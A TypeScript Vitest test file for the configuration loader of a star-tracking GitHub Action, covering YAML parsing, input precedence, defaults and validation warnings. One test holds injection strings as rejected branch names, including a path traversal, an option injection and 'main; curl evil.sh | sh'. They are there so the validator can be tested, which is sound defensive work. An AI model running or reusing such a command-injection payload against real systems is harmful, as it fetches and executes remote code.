import * as fs from "node:fs";
import * as core from "@actions/core";
import { CompareAgainst, NotificationMode } from "@domain/types";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { DEFAULTS } from "./defaults";
import { loadConfig, loadConfigFile } from "./loader";
import { ChartCurve, Visibility } from "./types";

vi.mock("@actions/core", () => ({
	getInput: vi.fn().mockReturnValue(""),
	info: vi.fn(),
	warning: vi.fn(),
}));

vi.mock("node:fs", async (importOriginal) => {
	const actual = await importOriginal<typeof import("node:fs")>();

	return {
		...actual,
		existsSync: vi.fn().mockReturnValue(false),
		readFileSync: vi.fn().mockReturnValue(""),
	};
});

function mockInputs(inputs: Record<string, string>): void {
	vi.mocked(core.getInput).mockImplementation((name: string) => inputs[name] ?? "");
}

describe("loadConfigFile", () => {
	beforeEach(() => {
		vi.clearAllMocks();
		vi.mocked(core.getInput).mockReturnValue("");
		vi.mocked(fs.existsSync).mockReturnValue(false);
		vi.mocked(fs.readFileSync).mockReturnValue("");
	});

	it("returns empty object when file does not exist", () => {
		expect(loadConfigFile("star-tracker.yml")).toEqual({});
	});

	it("parses YAML config file correctly", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue(`
        visibility: "private"
        include_archived: true
        include_forks: false
        exclude_repos:
        - "old-repo"
        only_repos: []
        min_stars: 5
    `);

		const config = loadConfigFile("star-tracker.yml");

		expect(config.visibility).toBe(Visibility.PRIVATE);
		expect(config.includeArchived).toBe(true);
		expect(config.includeForks).toBe(false);
		expect(config.excludeRepos).toEqual(["old-repo"]);
		expect(config.minStars).toBe(5);
	});

	it("accepts kebab-case keys in the config file", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue("include-charts: false\nmin-stars: 7");

		const config = loadConfigFile("star-tracker.yml");

		expect(config.includeCharts).toBe(false);
		expect(config.minStars).toBe(7);
	});

	it("prefers snake_case over kebab-case when both are present", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue("min_stars: 5\nmin-stars: 99");

		const config = loadConfigFile("star-tracker.yml");

		expect(config.minStars).toBe(5);
	});

	it("handles empty YAML file", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue("");
		expect(loadConfigFile("star-tracker.yml")).toEqual({});
	});

	it("handles a whitespace-only YAML file", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue("   \n  \n");
		expect(loadConfigFile("star-tracker.yml")).toEqual({});
	});

	it("returns empty object and warns on malformed YAML", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue('visibility: "public"\n  bad: : :');

		expect(loadConfigFile("star-tracker.yml")).toEqual({});
		expect(core.warning).toHaveBeenCalledWith(expect.stringContaining("Failed to parse config file"));
	});
});

describe("loadConfig", () => {
	beforeEach(() => {
		vi.clearAllMocks();
		vi.mocked(core.getInput).mockReturnValue("");
		vi.mocked(fs.existsSync).mockReturnValue(false);
		vi.mocked(fs.readFileSync).mockReturnValue("");
	});

	it("uses defaults when no config file and no inputs", () => {
		const config = loadConfig();

		expect(config.visibility).toBe(DEFAULTS.visibility);
		expect(config.includeArchived).toBe(DEFAULTS.includeArchived);
		expect(config.includeForks).toBe(DEFAULTS.includeForks);
		expect(config.excludeRepos).toEqual(DEFAULTS.excludeRepos);
		expect(config.onlyRepos).toEqual(DEFAULTS.onlyRepos);
		expect(config.minStars).toBe(DEFAULTS.minStars);
	});

	it("action inputs override config file values", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue('visibility: "public"\nmin_stars: 10');

		mockInputs({ visibility: "private", "min-stars": "20" });

		const config = loadConfig();

		expect(config.visibility).toBe(Visibility.PRIVATE);
		expect(config.minStars).toBe(20);
	});

	it("throws on invalid visibility", () => {
		mockInputs({ visibility: "invalid" });

		expect(() => loadConfig()).toThrow(/Invalid visibility/);
	});

	it("throws on a visibility inherited from Object.prototype", () => {
		mockInputs({ visibility: "toString" });

		expect(() => loadConfig()).toThrow(/Invalid visibility "toString"/);
	});

	it("lets config file values win over built-in defaults for every overridable key", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue(
			[
				"data_branch: my-data",
				"max_history: 10",
				"include_charts: false",
				"locale: es",
				"top_repos: 3",
				"track_stargazers: true",
				"smart_sampling: true",
				"smart_sampling_threshold: 900",
				"smart_sampling_pages: 7",
				"chart_max_points: 12",
				"chart_y_axis_side: right",
				"chart_smoothing: false",
				"chart_curve: catmull-rom",
				"chart_show_points: false",
				"chart_animation: false",
				"chart_milestones: false",
				"chart_begin_at_zero: true",
				"chart_theme: dark",
				"email_theme: light",
				"chart_range: 30d",
				"chart_trend_line: true",
				"velocity_metrics: true",
			].join("\n"),
		);

		const config = loadConfig();

		expect(config.dataBranch).toBe("my-data");
		expect(config.maxHistory).toBe(10);
		expect(config.includeCharts).toBe(false);
		expect(config.locale).toBe("es");
		expect(config.topRepos).toBe(3);
		expect(config.trackStargazers).toBe(true);
		expect(config.smartSampling).toBe(true);
		expect(config.smartSamplingThreshold).toBe(900);
		expect(config.smartSamplingPages).toBe(7);
		expect(config.chartMaxPoints).toBe(12);
		expect(config.chartYAxisSide).toBe("right");
		expect(config.chartSmoothing).toBe(false);
		expect(config.chartCurve).toBe(ChartCurve.CATMULL_ROM);
		expect(config.chartShowPoints).toBe(false);
		expect(config.chartAnimation).toBe(false);
		expect(config.chartMilestones).toBe(false);
		expect(config.chartBeginAtZero).toBe(true);
		expect(config.chartTheme).toBe("dark");
		expect(config.emailTheme).toBe("light");
		expect(config.chartRange).toBe("30d");
		expect(config.chartTrendLine).toBe(true);
		expect(config.velocityMetrics).toBe(true);
	});

	it.each([
		"../../etc",
		"main; curl evil.sh | sh",
		"-upload-pack=x",
		"foo//bar",
		"foo/.bar",
		"foo.",
		"foo.lock",
		"foo~1",
		"foo bar",
	])("rejects the data-branch %j", (dataBranch) => {
		mockInputs({ "data-branch": dataBranch });

		expect(() => loadConfig()).toThrow(/Invalid data-branch/);
	});

	it.each(["data/star-tracker", "_star-data", "stars@v2", "stars+data", "feature/JIRA-123", "v1.2.3", "UPPER_case-1"])(
		"accepts the valid git branch name %j",
		(dataBranch) => {
			mockInputs({ "data-branch": dataBranch });

			expect(loadConfig().dataBranch).toBe(dataBranch);
		},
	);

	it("defaults read-only to false", () => {
		expect(loadConfig().readOnly).toBe(false);
	});

	it("parses read-only from the input", () => {
		mockInputs({ "read-only": "true" });

		expect(loadConfig().readOnly).toBe(true);
	});

	it("reads read_only from the config file without a hand-written mapping", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue("read_only: true");

		expect(loadConfig().readOnly).toBe(true);
	});

	it("survives an unquoted hex colour in the config file", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue("chart_line_color: 123456");

		expect(() => loadConfig()).not.toThrow();
		expect(loadConfig().chartLineColor).toBe(DEFAULTS.chartLineColor);
	});

	it("accepts a quoted hex colour from the config file", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue('chart_line_color: "6b63ff"');

		expect(loadConfig().chartLineColor).toBe("#6b63ff");
	});

	it("falls back and warns on an unsupported locale", () => {
		mockInputs({ locale: "fr" });

		const config = loadConfig();

		expect(config.locale).toBe(DEFAULTS.locale);
		expect(core.warning).toHaveBeenCalledWith(
			'Invalid locale "fr". Must be "en", "es", "ca", or "it". Falling back to "en"',
		);
	});

	it("spells out the allowed values in an enum warning", () => {
		mockInputs({ "chart-curve": "zigzag" });

		loadConfig();

		expect(core.warning).toHaveBeenCalledWith(
			'Invalid chart-curve "zigzag". Must be "catmull-rom", "monotone", "cubic-bezier", or "rounded-step". Falling back to "monotone"',
		);
	});

	it("warns on an unrecognized boolean input instead of silently ignoring it", () => {
		mockInputs({ "chart-animation": "yes" });

		const config = loadConfig();

		expect(config.chartAnimation).toBe(DEFAULTS.chartAnimation);
		expect(core.warning).toHaveBeenCalledWith(expect.stringContaining('Invalid chart-animation "yes"'));
	});

	it("does not name a fallback the config file may override", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue("min_stars: 10");
		mockInputs({ "min-stars": "abc" });

		const config = loadConfig();

		expect(config.minStars).toBe(10);
		expect(core.warning).toHaveBeenCalledWith('Invalid min-stars "abc". Ignoring it.');
	});

	it("warns on an unparseable numeric input instead of silently ignoring it", () => {
		mockInputs({ "min-stars": "1o" });

		const config = loadConfig();

		expect(config.minStars).toBe(DEFAULTS.minStars);
		expect(core.warning).toHaveBeenCalledWith(expect.stringContaining('Invalid min-stars "1o"'));
	});

	it("does not warn when a numeric input is absent", () => {
		loadConfig();

		expect(core.warning).not.toHaveBeenCalledWith(expect.stringContaining("Invalid min-stars"));
	});

	it("warns when a notification threshold is combined with read-only", () => {
		mockInputs({ "read-only": "true", "notification-threshold": "500" });

		loadConfig();

		expect(core.warning).toHaveBeenCalledWith(
			expect.stringContaining('notification-threshold is set to "500" on a read-only run'),
		);
	});

	it("does not warn about read-only when the threshold is 0", () => {
		mockInputs({ "read-only": "true" });

		loadConfig();

		expect(core.warning).not.toHaveBeenCalledWith(expect.stringContaining("on a read-only run"));
	});

	it("defaults sendOnNoChanges from DEFAULTS", () => {
		const config = loadConfig();

		expect(config.sendOnNoChanges).toBe(DEFAULTS.sendOnNoChanges);
	});

	it("splits a scalar exclude_repos instead of leaving it a string", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue("exclude_repos: test-repo");

		const config = loadConfig();

		expect(config.excludeRepos).toEqual(["test-repo"]);
	});

	it("preserves an empty list from the config file", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue("only_repos: []");

		const config = loadConfig();

		expect(config.onlyRepos).toEqual([]);
	});

	it("treats a quoted boolean in the config file as a boolean", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue('include_archived: "false"');

		const config = loadConfig();

		expect(config.includeArchived).toBe(false);
	});

	it("accepts YAML-style booleans in the config file", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue('track_stargazers: "yes"');

		const config = loadConfig();

		expect(config.trackStargazers).toBe(true);
	});

	it("rejects an invalid chart_line_width from the config file", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue("chart_line_width: -3");

		const config = loadConfig();

		expect(config.chartLineWidth).toBe(DEFAULTS.chartLineWidth);
	});

	it("reads every config file key, including ones without dedicated tests", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue(
			["chart_y_axis_side: right", "smart_sampling_pages: 7", "chart_begin_at_zero: true"].join("\n"),
		);

		const config = loadConfig();

		expect(config.chartYAxisSide).toBe("right");
		expect(config.smartSamplingPages).toBe(7);
		expect(config.chartBeginAtZero).toBe(true);
	});

	it("parses notification-threshold as number", () => {
		mockInputs({ "notification-threshold": "5" });

		const config = loadConfig();
		expect(config.notificationThreshold).toBe(5);
	});

	it("parses notification-threshold as auto", () => {
		mockInputs({ "notification-threshold": "auto" });

		const config = loadConfig();
		expect(config.notificationThreshold).toBe("auto");
	});

	it("defaults notification-threshold to 0", () => {
		const config = loadConfig();

		expect(config.notificationThreshold).toBe(0);
	});

	it("reads notification-threshold from the config file when no input is set", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue("notification_threshold: 500");

		const config = loadConfig();

		expect(config.notificationThreshold).toBe(500);
	});

	it("parses notification-mode", () => {
		mockInputs({ "notification-mode": "gains" });

		const config = loadConfig();

		expect(config.notificationMode).toBe(NotificationMode.GAINS);
	});

	it("reads notification-mode from the config file", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue('notification_mode: "gains"');

		const config = loadConfig();

		expect(config.notificationMode).toBe(NotificationMode.GAINS);
	});

	it("warns and falls back on invalid notification-mode", () => {
		mockInputs({ "notification-mode": "gross" });

		const config = loadConfig();

		expect(config.notificationMode).toBe(DEFAULTS.notificationMode);
		expect(core.warning).toHaveBeenCalledWith(expect.stringContaining("Invalid notification-mode"));
	});

	it("defaults notification-mode to net", () => {
		const config = loadConfig();

		expect(config.notificationMode).toBe(NotificationMode.NET);
	});

	it("parses compare-against", () => {
		mockInputs({ "compare-against": "7d" });

		const config = loadConfig();

		expect(config.compareAgainst).toBe(CompareAgainst.D7);
	});

	it("reads compare-against from the config file", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue('compare_against: "30d"');

		const config = loadConfig();

		expect(config.compareAgainst).toBe(CompareAgainst.D30);
	});

	it("warns and falls back on invalid compare-against", () => {
		mockInputs({ "compare-against": "weekly" });

		const config = loadConfig();

		expect(config.compareAgainst).toBe(DEFAULTS.compareAgainst);
		expect(core.warning).toHaveBeenCalledWith(expect.stringContaining("Invalid compare-against"));
	});

	it("defaults compare-against to last-run", () => {
		const config = loadConfig();

		expect(config.compareAgainst).toBe(CompareAgainst.LAST_RUN);
	});

	it("parses exclude-repos input as comma-separated list", () => {
		mockInputs({ "exclude-repos": "repo-a, repo-b" });

		const config = loadConfig();

		expect(config.excludeRepos).toEqual(["repo-a", "repo-b"]);
	});

	it("parses only-orgs input as comma-separated list", () => {
		mockInputs({ "only-orgs": "org-a, org-b" });

		const config = loadConfig();

		expect(config.onlyOrgs).toEqual(["org-a", "org-b"]);
	});

	it("parses exclude-orgs input as comma-separated list", () => {
		mockInputs({ "exclude-orgs": "org-x,org-y" });

		const config = loadConfig();

		expect(config.excludeOrgs).toEqual(["org-x", "org-y"]);
	});

	it("reads only_orgs and exclude_orgs from config file", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue('only_orgs:\n- "org-a"\nexclude_orgs:\n- "org-z"');

		const config = loadConfig();

		expect(config.onlyOrgs).toEqual(["org-a"]);
		expect(config.excludeOrgs).toEqual(["org-z"]);
	});

	it("defaults org filters to empty arrays", () => {
		const config = loadConfig();

		expect(config.onlyOrgs).toEqual(DEFAULTS.onlyOrgs);
		expect(config.excludeOrgs).toEqual(DEFAULTS.excludeOrgs);
	});

	it("defaults chart line color and width", () => {
		const config = loadConfig();

		expect(config.chartLineColor).toBe(DEFAULTS.chartLineColor);
		expect(config.chartLineWidth).toBe(DEFAULTS.chartLineWidth);
	});

	it("parses chart-line-color and chart-line-width inputs", () => {
		mockInputs({ "chart-line-color": "#6f42c1", "chart-line-width": "4" });

		const config = loadConfig();

		expect(config.chartLineColor).toBe("#6f42c1");
		expect(config.chartLineWidth).toBe(4);
	});

	it("preserves decimal chart-line-width (does not truncate 2.5)", () => {
		mockInputs({ "chart-line-width": "2.5" });

		const config = loadConfig();

		expect(config.chartLineWidth).toBe(2.5);
	});

	it("falls back and warns on invalid chart-line-color", () => {
		mockInputs({ "chart-line-color": "red" });

		const config = loadConfig();

		expect(config.chartLineColor).toBe(DEFAULTS.chartLineColor);
		expect(core.warning).toHaveBeenCalledWith(expect.stringContaining("Invalid chart-line-color"));
	});

	it("accepts a bare hex chart-line-color without the leading #", () => {
		mockInputs({ "chart-line-color": "6b63ff" });

		const config = loadConfig();

		expect(config.chartLineColor).toBe("#6b63ff");
	});

	it("defaults chart-max-points and chart-y-axis-side", () => {
		const config = loadConfig();

		expect(config.chartMaxPoints).toBe(DEFAULTS.chartMaxPoints);
		expect(config.chartYAxisSide).toBe(DEFAULTS.chartYAxisSide);
	});

	it("parses chart-max-points input including 0 for full history", () => {
		mockInputs({ "chart-max-points": "0" });

		const config = loadConfig();

		expect(config.chartMaxPoints).toBe(0);
	});

	it("parses chart-y-axis-side input", () => {
		mockInputs({ "chart-y-axis-side": "right" });

		const config = loadConfig();

		expect(config.chartYAxisSide).toBe("right");
	});

	it("falls back and warns on invalid chart-y-axis-side", () => {
		mockInputs({ "chart-y-axis-side": "top" });

		const config = loadConfig();

		expect(config.chartYAxisSide).toBe(DEFAULTS.chartYAxisSide);
		expect(core.warning).toHaveBeenCalledWith(expect.stringContaining("Invalid chart-y-axis-side"));
	});

	it("defaults chart-smoothing to true", () => {
		const config = loadConfig();

		expect(config.chartSmoothing).toBe(true);
	});

	it("parses chart-smoothing input as false", () => {
		mockInputs({ "chart-smoothing": "false" });

		const config = loadConfig();

		expect(config.chartSmoothing).toBe(false);
	});

	it("defaults chart-show-points to true", () => {
		const config = loadConfig();

		expect(config.chartShowPoints).toBe(true);
	});

	it("parses chart-show-points input as false", () => {
		mockInputs({ "chart-show-points": "false" });

		const config = loadConfig();

		expect(config.chartShowPoints).toBe(false);
	});

	it("defaults chart-animation to true", () => {
		const config = loadConfig();

		expect(config.chartAnimation).toBe(true);
	});

	it("parses chart-animation input as false", () => {
		mockInputs({ "chart-animation": "false" });

		const config = loadConfig();

		expect(config.chartAnimation).toBe(false);
	});

	it("defaults chart-milestones to true", () => {
		const config = loadConfig();

		expect(config.chartMilestones).toBe(true);
	});

	it("parses chart-milestones input as false", () => {
		mockInputs({ "chart-milestones": "false" });

		const config = loadConfig();

		expect(config.chartMilestones).toBe(false);
	});

	it("defaults chart-begin-at-zero to false", () => {
		const config = loadConfig();

		expect(config.chartBeginAtZero).toBe(false);
	});

	it("parses chart-begin-at-zero input as true", () => {
		mockInputs({ "chart-begin-at-zero": "true" });

		const config = loadConfig();

		expect(config.chartBeginAtZero).toBe(true);
	});

	it("defaults chart-theme to auto", () => {
		const config = loadConfig();

		expect(config.chartTheme).toBe("auto");
	});

	it("parses chart-theme input as dark", () => {
		mockInputs({ "chart-theme": "dark" });

		const config = loadConfig();

		expect(config.chartTheme).toBe("dark");
	});

	it("warns and falls back to auto for an invalid chart-theme", () => {
		mockInputs({ "chart-theme": "sepia" });

		const config = loadConfig();

		expect(config.chartTheme).toBe("auto");
		expect(core.warning).toHaveBeenCalledWith(expect.stringContaining("Invalid chart-theme"));
	});

	it("defaults email-theme to auto, which resolves to auto when chart-theme is unset", () => {
		const config = loadConfig();

		expect(config.emailTheme).toBe("auto");
	});

	it("inherits the resolved chart-theme when email-theme is unset", () => {
		mockInputs({ "chart-theme": "dark" });

		const config = loadConfig();

		expect(config.emailTheme).toBe("dark");
	});

	it("inherits the resolved chart-theme when email-theme is an explicit auto", () => {
		mockInputs({ "chart-theme": "dark", "email-theme": "auto" });

		const config = loadConfig();

		expect(config.emailTheme).toBe("dark");
	});

	it("lets an explicit email-theme override chart-theme without changing it", () => {
		mockInputs({ "chart-theme": "light", "email-theme": "dark" });

		const config = loadConfig();

		expect(config.emailTheme).toBe("dark");
		expect(config.chartTheme).toBe("light");
	});

	it("warns and inherits chart-theme for an invalid email-theme", () => {
		mockInputs({ "chart-theme": "dark", "email-theme": "sepia" });

		const config = loadConfig();

		expect(config.emailTheme).toBe("dark");
		expect(core.warning).toHaveBeenCalledWith(expect.stringContaining("Invalid email-theme"));
	});

	it("defaults chart-custom-milestones to an empty list", () => {
		const config = loadConfig();

		expect(config.chartCustomMilestones).toEqual([]);
	});

	it("parses, sorts and de-duplicates chart-custom-milestones input", () => {
		mockInputs({ "chart-custom-milestones": "750, 250, 750, abc, -5, 2500" });

		const config = loadConfig();

		expect(config.chartCustomMilestones).toEqual([250, 750, 2500]);
	});

	it("reads chart-custom-milestones from the config file as a YAML list", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue("chart_custom_milestones:\n- 300\n- 100\n- 300");

		const config = loadConfig();

		expect(config.chartCustomMilestones).toEqual([100, 300]);
	});

	it("prefers the chart-custom-milestones input over the config file", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue("chart_custom_milestones:\n- 999");
		mockInputs({ "chart-custom-milestones": "42" });

		const config = loadConfig();

		expect(config.chartCustomMilestones).toEqual([42]);
	});

	it("reads chart-custom-milestones from the config file as a quoted string", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue('chart_custom_milestones: "300, 100, 300"');

		const config = loadConfig();

		expect(config.chartCustomMilestones).toEqual([100, 300]);
	});

	it("warns and falls back when chart-custom-milestones input has no valid numbers", () => {
		mockInputs({ "chart-custom-milestones": "abc, -5, 0" });

		const config = loadConfig();

		expect(config.chartCustomMilestones).toEqual([]);
		expect(core.warning).toHaveBeenCalledWith(expect.stringContaining("Invalid chart-custom-milestones"));
	});

	it("defaults chart-range to all", () => {
		const config = loadConfig();

		expect(config.chartRange).toBe("all");
	});

	it("parses chart-range input as 90d", () => {
		mockInputs({ "chart-range": "90d" });

		const config = loadConfig();

		expect(config.chartRange).toBe("90d");
	});

	it("warns and falls back to all for an invalid chart-range", () => {
		mockInputs({ "chart-range": "7d" });

		const config = loadConfig();

		expect(config.chartRange).toBe("all");
		expect(core.warning).toHaveBeenCalledWith(expect.stringContaining("Invalid chart-range"));
	});

	it("defaults chart-curve to monotone", () => {
		const config = loadConfig();

		expect(config.chartCurve).toBe(ChartCurve.MONOTONE);
	});

	it("parses chart-curve input as rounded-step", () => {
		vi.mocked(core.getInput).mockImplementation((name: string) => {
			if (name === "chart-curve") return ChartCurve.ROUNDED_STEP;
			return "";
		});

		const config = loadConfig();

		expect(config.chartCurve).toBe(ChartCurve.ROUNDED_STEP);
	});

	it("warns and falls back to monotone for an invalid chart-curve", () => {
		mockInputs({ "chart-curve": "wavy" });

		const config = loadConfig();

		expect(config.chartCurve).toBe(ChartCurve.MONOTONE);
		expect(core.warning).toHaveBeenCalledWith(expect.stringContaining("Invalid chart-curve"));
	});

	it("defaults chart-trend-line to false", () => {
		const config = loadConfig();

		expect(config.chartTrendLine).toBe(false);
	});

	it("parses chart-trend-line input as true", () => {
		mockInputs({ "chart-trend-line": "true" });

		const config = loadConfig();

		expect(config.chartTrendLine).toBe(true);
	});

	it("defaults velocity-metrics to false", () => {
		const config = loadConfig();

		expect(config.velocityMetrics).toBe(false);
	});

	it("parses velocity-metrics input as true", () => {
		mockInputs({ "velocity-metrics": "true" });

		const config = loadConfig();

		expect(config.velocityMetrics).toBe(true);
	});

	it("defaults track-stargazers to false", () => {
		const config = loadConfig();

		expect(config.trackStargazers).toBe(false);
	});

	it("parses track-stargazers input as true", () => {
		mockInputs({ "track-stargazers": "true" });

		const config = loadConfig();

		expect(config.trackStargazers).toBe(true);
	});

	it("reads track_stargazers from config file", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue("track_stargazers: true");

		const config = loadConfig();

		expect(config.trackStargazers).toBe(true);
	});

	it("defaults smart sampling options", () => {
		const config = loadConfig();

		expect(config.smartSampling).toBe(DEFAULTS.smartSampling);
		expect(config.smartSamplingThreshold).toBe(DEFAULTS.smartSamplingThreshold);
		expect(config.smartSamplingPages).toBe(DEFAULTS.smartSamplingPages);
	});

	it("parses smart-sampling inputs", () => {
		mockInputs({
			"smart-sampling": "true",
			"smart-sampling-threshold": "5000",
			"smart-sampling-pages": "10",
		});

		const config = loadConfig();

		expect(config.smartSampling).toBe(true);
		expect(config.smartSamplingThreshold).toBe(5000);
		expect(config.smartSamplingPages).toBe(10);
	});

	it("reads smart_sampling options from config file", () => {
		vi.mocked(fs.existsSync).mockReturnValue(true);
		vi.mocked(fs.readFileSync).mockReturnValue(
			"smart_sampling: true\nsmart_sampling_threshold: 2000\nsmart_sampling_pages: 15",
		);

		const config = loadConfig();

		expect(config.smartSampling).toBe(true);
		expect(config.smartSamplingThreshold).toBe(2000);
		expect(config.smartSamplingPages).toBe(15);
	});
});
